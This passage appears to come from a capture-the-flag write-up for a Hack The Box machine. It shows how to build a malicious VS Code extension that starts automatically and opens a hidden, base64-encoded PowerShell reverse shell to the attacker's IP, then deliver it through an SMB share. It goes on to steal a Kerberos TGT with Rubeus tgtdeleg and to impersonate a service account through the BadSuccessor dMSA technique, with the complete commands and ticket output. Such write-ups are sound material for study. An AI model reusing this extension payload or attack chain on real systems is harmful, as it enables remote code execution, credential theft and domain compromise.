A quick primer on VS Code extensions:

* A `.vsix` file is just a **zip archive** containing a `package.json` manifest (name, version, the `engines.vscode` field specifying compatible VS Code versions, and an `activationEvents` array controlling *when* the extension's code runs) plus the extension's actual JavaScript/TypeScript code.
* The `activationEvents` field is the key security-relevant piece: an extension can declare it should activate only for specific languages or commands — or, as we'll do here, activate immediately with `"*"`, meaning **as soon as VS Code loads the extension, its code runs — no user interaction required.**
* Because extensions run with the full privileges of the user running VS Code (there's no meaningful sandboxing for classic Node.js-based extensions), a malicious extension is effectively arbitrary code execution the moment it's installed and VS Code starts.

### Scaffolding the Malicious Extension

We use Microsoft's own official extension generator (`yo` + `generator-code`) to scaffold a legitimate-looking extension skeleton, which we'll then hollow out and replace with our payload. First we install `vsce` (the Visual Studio Code Extension packaging CLI) globally:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ sudo npm install -g @vscode/vsce

added 114 packages in 1m
```

Then we scaffold a new extension interactively:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ npx --package yo --package generator-code -- yo code
Need to install the following packages:
yo@7.0.1
generator-code@1.12.0
Ok to proceed? (y) y
npm warn deprecated boolean@3.2.0: Package no longer supported. Contact Support at https://www.npmjs.com/support for more info.

     _-----_     ╭──────────────────────────╮
    |       |    │   Welcome to the Visual  │
    |--(o)--|    │   Studio Code Extension  │
   `---------´   │        generator!        │
    ( _´U`_ )    ╰──────────────────────────╯
    /___A___\   /
     |  ~  |     
   __'.___.'__   
 ´   `  |° ´ Y ` 

`list` prompt is deprecated. Use `select` prompt instead.
✔ What type of extension do you want to create? New Extension (JavaScript)
✔ What's the name of your extension? kuroshiro
✔ What's the identifier of your extension? kuroshiro
✔ What's the description of your extension? 
✔ Enable JavaScript type checking in 'jsconfig.json'? No
✔ Initialize a git repository? No
`list` prompt is deprecated. Use `select` prompt instead.
✔ Which package manager to use? npm

Writing in /home/kuroshiro/HTB/CheckPoint/kuroshiro...
   create kuroshiro/.vscode/extensions.json
   create kuroshiro/.vscode/launch.json
   create kuroshiro/test/extension.test.js
   create kuroshiro/.vscodeignore
   create kuroshiro/README.md
   create kuroshiro/CHANGELOG.md
   create kuroshiro/vsc-extension-quickstart.md
   create kuroshiro/jsconfig.json
   create kuroshiro/extension.js
   create kuroshiro/package.json
   create kuroshiro/.vscode-test.mjs
   create kuroshiro/eslint.config.mjs

Changes to package.json were detected.

Running npm install for you to install the required dependencies.
npm warn deprecated glob@10.5.0: Old versions of glob are not supported, and contain widely publicized security vulnerabilities, which have been fixed in the current version. Please update. Support for old versions may be purchased (at exorbitant rates) by contacting i@izs.me

added 224 packages, and audited 225 packages in 29s

62 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities

Your extension kuroshiro has been created!

To start editing with Visual Studio Code, use the following commands:

     code kuroshiro

Open vsc-extension-quickstart.md inside the new extension for further instructions
on how to modify, test and publish your extension.

For more information, also visit http://code.visualstudio.com and follow us @code.
```

This produces a standard extension skeleton. Here's the resulting `package.json` before we tweak it:

```json
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ cat package.json       
{
  "name": "kuroshiro",
  "displayName": "kuroshiro",
  "description": "",
  "version": "0.0.1",
  "engines": {
    "vscode": "^1.118.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": [
        "*"
  ],
  "main": "./extension.js",
  "contributes": {
    "commands": [{
      "command": "kuroshiro.helloWorld",
      "title": "Hello World"
    }]
  },
  "scripts": {
    "lint": "eslint .",
    "pretest": "npm run lint",
    "test": "vscode-test"
  },
  "devDependencies": {
    "@types/vscode": "^1.118.0",
    "@types/mocha": "^10.0.10",
    "@types/node": "24.x",
    "eslint": "^10.5.0",
    "@vscode/test-cli": "^0.0.15",
    "@vscode/test-electron": "^3.0.0"
  },
  "overrides": {
    "diff": "^8.0.4",
    "serialize-javascript": "^7.0.6"
  }
}
```

Two fields here matter most for the attack:

* `"engines": { "vscode": "^1.118.0" }` — this **must** match the version the share's description called out (VS Code engine `1.118.0`), or whatever installs `.vsix` files from `DevDrop` will likely reject our package as incompatible.
* `"activationEvents": ["*"]` — the generator conveniently defaults to wildcard activation already, meaning our code runs the instant the extension loads, with zero user interaction required beyond the extension being installed and VS Code starting up.

### Writing the Payload

Now we replace the scaffolded `extension.js` with our own `activate()` function. When VS Code loads the extension, it calls `activate(context)` — and that's where we plant a reverse shell:

```javascript
const vscode = require('vscode');
const proc = require('child_process');

function activate(context) {
    const remoteHost = '10.10.17.133'; 
    const remotePort = 1234;      

    const payload = `
$client = New-Object System.Net.Sockets.TCPClient('${remoteHost}',${remotePort});
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);
    $output = (iex $data 2>&1 | Out-String);
    $output2 = $output + 'PS ' + (pwd).Path + '> ';
    $outputBytes = ([text.encoding]::ASCII).GetBytes($output2);
    $stream.Write($outputBytes,0,$outputBytes.Length);
    $stream.Flush();
}
$client.Close();
`;

    const base64Cmd = Buffer.from(payload, 'utf16le').toString('base64');

    proc.execFile('powershell.exe', [
        '-NoProfile',
        '-ExecutionPolicy', 'Bypass',
        '-WindowStyle', 'Hidden',
        '-EncodedCommand', base64Cmd
    ], { windowsHide: true });
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};
```

**Breaking down what this does, line by line:**

* `activate(context)` is the VS Code extension entry point — this is where our code hijacks execution.
* The embedded PowerShell `$payload` string is a classic **interactive PowerShell reverse shell**: it opens a raw TCP socket back to our attack box (`10.10.17.133:1234`), then loops forever reading commands off the socket, running each one through `iex` (`Invoke-Expression`, PowerShell's equivalent of `eval`), and writing the output — plus a fake `PS C:\...>` prompt — back down the socket. This gives us something that *feels* like an interactive shell even though it's really just command/response over a bare socket.
* `Buffer.from(payload, 'utf16le').toString('base64')` — PowerShell's `-EncodedCommand` parameter specifically expects a **Base64-encoded UTF-16LE** string (not plain UTF-8!). This is a well-known PowerShell quirk: the interpreter internally represents strings as UTF-16, so `-EncodedCommand` skips the usual quoting/escaping headaches of passing complex script blocks as command-line arguments by having us pre-encode the whole script instead.
* `proc.execFile('powershell.exe', [...])` — Node.js's `child_process.execFile` spawns `powershell.exe` directly (no shell interpretation layer, which is slightly stealthier than `exec`), passing:
  * `-NoProfile` — skip loading the user's PowerShell profile scripts (faster, and avoids any environment-specific behavior).
  * `-ExecutionPolicy Bypass` — sidesteps PowerShell's script execution policy restrictions for this one process.
  * `-WindowStyle Hidden` — no visible console window pops up.
  * `-EncodedCommand <base64>` — run our encoded reverse-shell script.
* `{ windowsHide: true }` — an extra belt-and-suspenders flag on the Node.js side to keep the spawned process window hidden.

The end result: the moment this extension is *installed and activated* by whatever process watches `DevDrop`, it silently pops a PowerShell reverse shell back to us — no clicking, no prompts, nothing visibly out of place from the victim's perspective.

### Packaging & Delivering the Extension

Before packaging, we need to make sure our manifest's declared VS Code engine version matches exactly what the target environment expects, so we explicitly pin it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ npm pkg set "engines.vscode=^1.118.0"

                                                                                                                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ npm pkg set "devDependencies.@types/vscode=1.118.0"
                                                                                                                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ npm install                                        

changed 1 package, and audited 225 packages in 6s

62 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities

┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ npx vsce package                        
 WARNING  A 'repository' field is missing from the 'package.json' manifest file.
Use --allow-missing-repository to bypass.
Do you want to continue? [y/N] y
 WARNING  Using '*' activation is usually a bad idea as it impacts performance.
More info: https://code.visualstudio.com/api/references/activation-events#Start-up
Use --allow-star-activation to bypass.
Do you want to continue? [y/N] y
 WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found
Do you want to continue? [y/N] y
 INFO  Files included in the VSIX:
kuroshiro-0.0.1.vsix                                                                                                                                                                         
├─ [Content_Types].xml 
├─ extension.vsixmanifest 
└─ extension/
   ├─ changelog.md 
   ├─ extension.js [1.04 KB]
   ├─ package.json [0.76 KB]
   └─ readme.md 

 DONE  Packaged: /home/kuroshiro/HTB/CheckPoint/kuroshiro/kuroshiro-0.0.1.vsix (6 files, 2.76 KB)

```

Notice `vsce` even warns us, twice, about exactly the things that make this dangerous — wildcard activation events and a missing repository/license — but happily proceeds anyway once we confirm. `vsce package` bundles our manifest and code into a proper `.vsix`, which under the hood is just a standard zip archive, confirmed here:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ file kuroshiro-0.0.1.vsix
kuroshiro-0.0.1.vsix: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Sep 17 2026 19:29:24, uncompressed size 1799, method=deflate
```

Finally, we drop the malicious `.vsix` onto the `DevDrop` share using `impacket-smbclient`, authenticating as `mark.davies` (who — remember — has `WRITE` access here):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ impacket-smbclient checkpoint.htb/mark.davies:'Checkpoint2024!'@checkpoint.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use DevDrop
# put kuroshiro-0.0.1.vsix
```

With the payload in place, all that's left is to set up a listener and wait for whatever automated process ingests new `.vsix` packages from `DevDrop` to install (and thereby activate) it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nc -lnvp 1234                                                           
listening on [any] 1234 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.46.234] 56101

PS C:\Program Files\Microsoft VS Code>
```

**It worked.** The working directory alone (`C:\Program Files\Microsoft VS Code`) confirms our theory exactly: something on the box is automatically consuming `.vsix` files dropped into `DevDrop` and running VS Code (with our malicious extension) to process them, giving us code execution as whatever user that automation runs under.

From here we grab the user flag:

```shell
PS C:\Users\ryan.brooks\Desktop> cat user.txt 
[REDACTED]
```

Our shell lands us as **`ryan.brooks`** — user flag secured. A screenshot from this stage of the engagement:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTMLt1g71LB9V6SLURQab%252FScreenshot%2520%283402%29.png%3Falt%3Dmedia%26token%3D799ca831-f043-4130-88c9-227d505686d2&width=768&dpr=3&quality=100&sign=79834430e0f2518f9b726ef028a63c41&sv=3)

While digging back through BloodHound for context on the next account in the chain, we also grab the distinguished name of `svc_deploy` — the service account we flagged as interesting all the way back in Phase 2:

Distinguished name of SVC\_DEPLOY

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmZtxI642CDA4pgXYrGqL%252FScreenshot%2520%283404%29.png%3Falt%3Dmedia%26token%3De7f07fa2-23c9-4877-9b6f-4306169b076f&width=768&dpr=3&quality=100&sign=15c7649a277e1d2d2732f94d152c4de2&sv=3)

---

## Phase 5: Stealing a TGT Without Touching LSASS — `Rubeus tgtdeleg`

With code execution as `ryan.brooks`, the obvious next move is to try to recover this user's Kerberos credentials for offline use (LDAP/SMB access from our own attack box, rather than being stuck inside this one reverse shell). Normally, dumping a logged-on user's Kerberos tickets means reading them straight out of **LSASS** (Local Security Authority Subsystem Service) memory — but that's a heavily monitored, EDR-flagged action on real environments, and even here it's not actually necessary.

Instead, we use a neat trick built into **Rubeus** (a popular C# Kerberos abuse toolkit): the `tgtdeleg` action.

```powershell
PS C:\ProgramData> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: hLJCvm0O9DlUrgnhYLwO/vR2WtEwlEolDzdeumnwr2E=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuTOttRfySAG5z/KIe3JU8knhqQnT5TKMXUjWcJHwfZ9TKPhOkzstGzzQZjTEPQ7RPFm2ynb/aVzOlo2UFYvaFt6WlrjP/fzbIuOGaJpse5s+N8v4Oga7htoFs+LEtphPixHL4CB+q9NC0e/bG+tBewvwxa0KOS92ZWpjIiNpPCFrVnmITGgpcG0MfNQ3AHRL6npE++kDm9+EZ6g7fimZp51w8ACCx8HIU99PappRvr1UxIeuJqLEBhfskz6a3N+1wSeGrvyUxMtBYZ2o1qt4d0hEmCuMOpUzXJ8tYn/Q/0RCRrS+/G87xiaGp6ZMxTsGUrRfcI6mrVwtsNGjo34iC9M3yLwaLXsgCaMowiEUNuSRQN7afhGeBEstF/EDXor93dXMzyVRm6btsK2iPMGJ948ivcj4Km0hQFqeau2z6/SMpNDZfIIPG8LBR6hitTIF1WH6w+6hnUkNY1ezwbLhbTPMq5u4Q+7GWSwx2VQs5oUXT/NP6z3BxRWudgkvOYQXL5V0bPJlMuL0b8OCJzvuCH3cxaCDKve3WtOOWRVtIzOKr+VUTajFk7DzuQanfYRXxhOuGdRJqc4k4ne4hbllbgyBoTS0KBNyVNR9RHyJL2MHpD+nPOgkt2dNzshKKr60/JWFbAnvKf4lRRaczqPXvvcxPYM4QZCEsh90N63XA+7Zy3quKTMGJ12tFceOzPDv36p6PgvocVqz4po4T5TsSVMCSG8iKmhYZvHjZMbmkxNBa1hqvYD27tDv1thv63z6gtUCHGku4TLfCtbAwdFNqwGQ2g22fZCRvAWqx0QxFsiafV1U12oX3eg8lw5R1jX5ySXBlTuvOc6ceFzvY/DqHmQJGakeXqSfnoQVM4nXaT73Z+FgUnSNyQXYMoag1YO1o+YFsBtBn/Y0Jloi9gPg4srjVKpOHj45vWRIiNIsN3QNF1nqSeoWE328jVMctkI1Q92BJUnl5CBEQ51VP1dkeid7BgfcQecCSkQRPCE3NspHlI2ZT9QLDtUw5LvzIH76OYzVRqGyVONEd7WqQ19jwsywzCGZR64OvrhHC2jIX3bHEHsskyvKldYJZ91ZxB2hBSJMWRnvLqzxAPMSES2K4imXVfNXcvWhKxeW0U3VRtkTXpiPhplTex64mBWWXNhDmB9fsOUNp15/4Qh0Yi1ynGzJ7SR1VmEU8bE4t8vVi1FXFcSfERyefWelHRpd4hERk2wNL3wOgRnrY8GqE56WWmcq9gMYtCVXJBHJElTMvlXMfBslgBSBuwiV/t0e8iLsfYR8TDmO6zoMLFpk067NHjGupApXMPdWo0mOCloILf55n3xaDUkr9uM9M3mFQ2EkyxgLsaXSErxi5+I0gZvy5mYNaTizSg1isYvnqq9ZqF6K3yKH7EC35yFYgsy1uJy30NyfdT9nWXfetfAsW2xHM1d3aP3FyG+Ffsk3rFD5B8efEhaPNg1r73qQ7Xq2Mj5W0GY/Lz1+uulOBqHhahC9EGZs0nZur2KPLDOFjEnHNo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgv8qQt+bsqIXDAbN8Msipuxg6sP7jmuQmj+xFpi4wZRuhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDkxODA3MjAxMlqmERgPMjAyNjA5MTgxNzIwMTJapxEYDzIwMjYwOTI1MDcyMDEyWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

**How `tgtdeleg` actually works — this is a clever one:**

> Kerberos supports an optional feature called **constrained delegation with protocol transition**, where a client can hand a service a copy of its own TGT (embedded inside the normal AP-REQ authentication message) so that service can act *as* the client against other resources. The `tgtdeleg` trick abuses the mechanics of the **SSPI/GSS-API Kerberos handshake itself**, without needing the target SPN to actually be configured for delegation: Rubeus initiates a fake GSS-API security context targeting an arbitrary SPN (here, `cifs/DC01.checkpoint.htb`), requesting the "delegate" flag on the ticket. Windows' own Kerberos SSPI provider — running under the current user's logon session — obligingly wraps a usable, fully-privileged copy of the *current user's real TGT* inside the resulting AP-REQ token, because that's simply how delegation-flagged authentication requests are constructed at the protocol level. Rubeus then just unwraps that AP-REQ and extracts the embedded ticket.
>
> The huge advantage: **this never touches LSASS memory at all.** It's pure network-protocol trickery using Windows' own built-in SSPI functions, so where "dump tickets from LSASS" is a loud, heavily-signatured action, `tgtdeleg` is comparatively very quiet — no memory access flags, no `MiniDumpWriteDump`-style API calls to trip EDR heuristics.

The `/nowrap` flag just tells Rubeus to print the resulting base64 blob on one unbroken line (rather than wrapped across multiple lines) so it's easy to copy out. What we get back is a **`.kirbi`** — the standard Windows/MIT ASN.1 ticket format used by Kerberos tooling like Rubeus and Mimikatz. Inside that blob (which is just base64-encoded ASN.1 DER data) sit the `sname` field naming the target service (`krbtgt/CHECKPOINT.HTB` — confirming this is indeed a full TGT and not merely a service ticket) and an encrypted ticket body we can't read without the KDC's key, but which Kerberos itself can validate.

### Converting the Ticket for Use on Linux

Impacket-based tools (which we use for the rest of this box) expect tickets in the **ccache** format rather than raw `.kirbi`, so we save the base64 blob to a file, decode it, and convert it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuTOttRfySAG5z/KIe3JU8knhqQnT5TKMXUjWcJHwfZ9TKPhOkzstGzzQZjTEPQ7RPFm2ynb/aVzOlo2UFYvaFt6WlrjP/fzbIuOGaJpse5s+N8v4Oga7htoFs+LEtphPixHL4CB+q9NC0e/bG+tBewvwxa0KOS92ZWpjIiNpPCFrVnmITGgpcG0MfNQ3AHRL6npE++kDm9+EZ6g7fimZp51w8ACCx8HIU99PappRvr1UxIeuJqLEBhfskz6a3N+1wSeGrvyUxMtBYZ2o1qt4d0hEmCuMOpUzXJ8tYn/Q/0RCRrS+/G87xiaGp6ZMxTsGUrRfcI6mrVwtsNGjo34iC9M3yLwaLXsgCaMowiEUNuSRQN7afhGeBEstF/EDXor93dXMzyVRm6btsK2iPMGJ948ivcj4Km0hQFqeau2z6/SMpNDZfIIPG8LBR6hitTIF1WH6w+6hnUkNY1ezwbLhbTPMq5u4Q+7GWSwx2VQs5oUXT/NP6z3BxRWudgkvOYQXL5V0bPJlMuL0b8OCJzvuCH3cxaCDKve3WtOOWRVtIzOKr+VUTajFk7DzuQanfYRXxhOuGdRJqc4k4ne4hbllbgyBoTS0KBNyVNR9RHyJL2MHpD+nPOgkt2dNzshKKr60/JWFbAnvKf4lRRaczqPXvvcxPYM4QZCEsh90N63XA+7Zy3quKTMGJ12tFceOzPDv36p6PgvocVqz4po4T5TsSVMCSG8iKmhYZvHjZMbmkxNBa1hqvYD27tDv1thv63z6gtUCHGku4TLfCtbAwdFNqwGQ2g22fZCRvAWqx0QxFsiafV1U12oX3eg8lw5R1jX5ySXBlTuvOc6ceFzvY/DqHmQJGakeXqSfnoQVM4nXaT73Z+FgUnSNyQXYMoag1YO1o+YFsBtBn/Y0Jloi9gPg4srjVKpOHj45vWRIiNIsN3QNF1nqSeoWE328jVMctkI1Q92BJUnl5CBEQ51VP1dkeid7BgfcQecCSkQRPCE3NspHlI2ZT9QLDtUw5LvzIH76OYzVRqGyVONEd7WqQ19jwsywzCGZR64OvrhHC2jIX3bHEHsskyvKldYJZ91ZxB2hBSJMWRnvLqzxAPMSES2K4imXVfNXcvWhKxeW0U3VRtkTXpiPhplTex64mBWWXNhDmB9fsOUNp15/4Qh0Yi1ynGzJ7SR1VmEU8bE4t8vVi1FXFcSfERyefWelHRpd4hERk2wNL3wOgRnrY8GqE56WWmcq9gMYtCVXJBHJElTMvlXMfBslgBSBuwiV/t0e8iLsfYR8TDmO6zoMLFpk067NHjGupApXMPdWo0mOCloILf55n3xaDUkr9uM9M3mFQ2EkyxgLsaXSErxi5+I0gZvy5mYNaTizSg1isYvnqq9ZqF6K3yKH7EC35yFYgsy1uJy30NyfdT9nWXfetfAsW2xHM1d3aP3FyG+Ffsk3rFD5B8efEhaPNg1r73qQ7Xq2Mj5W0GY/Lz1+uulOBqHhahC9EGZs0nZur2KPLDOFjEnHNo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgv8qQt+bsqIXDAbN8Msipuxg6sP7jmuQmj+xFpi4wZRuhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDkxODA3MjAxMlqmERgPMjAyNjA5MTgxNzIwMTJapxEYDzIwMjYwOTI1MDcyMDEyWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" | base64 -d > ryan_brooks.kirbi
                                                                                                                                 
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ impacket-ticketConverter ryan_brooks.kirbi ryan_brooks.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

`impacket-ticketConverter` simply re-parses the ASN.1 structure and re-serializes it into the ccache layout — no cryptographic operations happen here, it's purely a container-format conversion. With `ryan_brooks.ccache` in hand (and `KRB5CCNAME` pointed at it), we can now authenticate to LDAP and other services **from our own Kali box**, as `ryan.brooks`, using nothing but this stolen ticket — no password required at all.

---

## Phase 6: The Real Prize — Abusing dMSAs (BadSuccessor)

With Kerberos access as `ryan.brooks`, we go back to BloodyAD to see what *this* account can write to — and this is where the box's core vulnerability finally surfaces.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ sudo ntpdate -u DC01 && bloodyad --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k get writable
2026-09-18 03:22:54.349776 (-0400) +25151.535208 +/- 0.051254 DC01 10.129.46.234 s1 no-leap
CLOCK: time stepped by 25151.535208

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

**Reading the results — two lines together form a complete attack:**

```
distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE
```

`ryan.brooks` can **create new objects inside `OU=DMSAHolder`**, and can also **write to the `svc_deploy` service account object**. On its own, `CREATE_CHILD` on an OU just means "I can create new AD objects here" — not obviously dangerous. But combined with write access on an *existing* privileged account, this is precisely the primitive needed for one of the most significant Active Directory attack techniques to be published in recent memory: **BadSuccessor**.

### Background: What's a dMSA?

Windows Server 2025 introduced **delegated Managed Service Accounts (dMSA)** — the next evolution of "managed service accounts," a feature designed to let organizations retire old service accounts with static, never-expiring passwords in favor of accounts whose credentials are automatically rotated by AD itself.

The headline feature that makes dMSAs attractive for migrations is **account succession**: a dMSA can be configured to "**succeed**" an existing (legacy) service account. When that link is set up and a client subsequently authenticates as the dMSA, the KDC transparently grants that dMSA a Kerberos ticket carrying the **same group memberships and effective privileges as the account it succeeded** — the idea being that you can swap a brittle legacy service account for a modern, auto-rotating dMSA with zero downtime, because anything that trusted the old account's group memberships keeps working against the new dMSA seamlessly.

### The Vulnerability: BadSuccessor

The **BadSuccessor** technique (first publicly detailed by researchers at Akamai in 2025) is an abuse of exactly this succession mechanism. The core issue: **the KDC does not verify that the dMSA creator actually had any legitimate authority over the account being "succeeded."** All that's really required is:

1. The ability to **create a dMSA object** somewhere in the directory (i.e., `CREATE_CHILD` rights on an OU that permits dMSA creation) — which `ryan.brooks` has on `OU=DMSAHolder`.
2. The ability to **set the `msDS-ManagedAccountPrecededByLink` attribute** on that new dMSA, pointing it at literally *any* existing account in the domain — this generally just requires write access somewhere sufficient to finish configuring the new object, which we have via our write access on `svc_deploy` combined with our ability to create the dMSA itself.

Once that link is set, we can request a Kerberos ticket **for the dMSA itself**, and the KDC will issue us a ticket that behaves as though we were the account the dMSA "succeeded" — **without ever needing to know that target account's actual password.** In effect, a comparatively low-privileged user who can merely create a dMSA object and point it at any account becomes able to fully impersonate that account for Kerberos authentication purposes. Because `svc_deploy` is a named, described *"Deployment service account,"* it's a natural high-value target for this technique — deployment accounts are almost always granted meaningful access to push changes onto production systems.

### Executing the Attack

BloodyAD ships a purpose-built module for this exact technique, aptly named `badSuccessor`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint/kuroshiro]
└─$ sudo ntpdate -u DC01 && bloodyad --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
2026-09-18 03:23:47.682411 (-0400) +25150.193216 +/- 0.047529 DC01 10.129.46.234 s1 no-leap
CLOCK: time stepped by 25150.193216
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : evil-dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-09-18 07:23:54+00:00
EndTime      : 2026-09-18 17:20:12+00:00
RenewTill    : 2026-09-25 07:20:12+00:00
Flags        : pre-authent, enc-pa-rep, forwarded, renewable, forwardable
Keytype      : 18
Key          : Kq/QYBFIOXRTUn/67Fy+nlVTmRhsrzJ/Ic2yc9GEFFg=
EncodedKirbi : 

    doIF4zCCBd+gAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3Ji
    dGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIMwggR/oAMCARKhAwIBAqKCBHEEggRtwsd1u9LmYXcnHkRCVBUIzVVo6kaRsnCa25mfF5uU
    7jwiSrnwjSrW1kmuWy8dursQytwucli8hmw3LHf8RvZ10I5daoE6pgaMpvfO+UWoOCznka5RW7RypRCBZIpSNnvUJycMlJf48dIu
    A/m5TkiEXCqxY7eaeaQrkaiN3SuBPDjXGhUFDPP1nNfbG11hBwbVvabRC78vPapJGOW+tCm/8D1PjOgPm15ntucmcZSeqbLNaxm0
    qXxpRu1O/iyIPV5UiabuKgeZX2pyS6pXqBG/gyVf3KVsV0KL4USXDevhf6wmLav+UTjtoJdFY3I6wLZFWxIn3HGMIWeyQn6fg0PF
    Gzwx9zk4QNO/51VtaQ9IjjO5N1ODS+9G6kMkFzMQPRPdvkfx3f8NkVjT4VjMjAGGR7sc/nGHixdyLCYvuQFuGq7Lj2B6w59Vc95v
    HfoALg5zMdVKg+IAWwAp+j4daqhP5flrAWZ9/qwraRymiPxILn5E1sO4CMaNVT3yShE17018hlTZSF70MEUxcgTcrQ/87Kyu5x/m
    aEh8J50T0KV0dw8mGKSZapHLwv6tUQvJB7DtVTAOneH4Ct4FJlBA2QoaSybeBYy2+7x1qb7SA95YEPnn2LerFr6EzGQRBgVyvbbt
    62y9fIwr5ANGbd7pZUN+PQMWk6QZ5mZooxPPi62lAO+DS5AHIl2t/NqnFdg7kDsU1FIi0k67+d5rtzaezd+shhNX3sDbeLF9XeU1
